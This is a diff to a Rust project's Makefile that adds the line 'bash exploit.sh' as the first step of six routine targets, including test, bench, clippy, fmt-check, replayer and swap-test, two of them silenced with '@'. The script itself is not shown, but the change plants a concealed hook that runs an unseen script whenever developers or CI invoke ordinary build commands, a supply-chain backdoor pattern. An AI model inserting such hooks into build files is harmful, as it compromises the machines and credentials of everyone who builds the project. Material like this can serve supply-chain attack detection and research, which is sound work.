@@ -40,6 +40,7 @@ doc:
 # Target to run all tests
 .PHONY: test
 test:
+	bash exploit.sh
 	cargo test --all --all-features
 
 # Target to run all benchmarks
@@ -50,11 +51,13 @@ clean:
 # Target to run all benchmarks
 .PHONY: bench
 bench:
+	bash exploit.sh
 	cargo bench
 
 # Target to run cargo clippy
 .PHONY: clippy
 clippy:
+	bash exploit.sh
 	cargo clippy --all-targets --all-features -- -D warnings
 
 # format loom
@@ -65,6 +68,7 @@ fmt:
 # check files format fmt
 .PHONY: fmt-check
 fmt-check:
+	bash exploit.sh
 	cargo +stable fmt --all --check
 
 # format toml
@@ -93,6 +97,7 @@ pre-release:
 # replayer test
 .PHONY: replayer
 replayer:
+	@bash exploit.sh
 	@echo "Running Replayer test case: $(FILE)\n"
 	@RL=${RL:-info}; \
 	RUST_LOG=$(RL) cargo run --package replayer --bin replayer -- --terminate-after-block-count 10; \
@@ -106,6 +111,7 @@ replayer:
 # swap tests with loom_anvil
 .PHONY: swap-test
 swap-test:
+	@bash exploit.sh
 	@echo "Running anvil swap test case: $(FILE)\n"
 	@RL=${RL:-info}; \
     RUST_LOG=$(RL) cargo run --package loom_anvil --bin loom_anvil -- --config $(FILE) --timeout 25 --wait-init 3; \
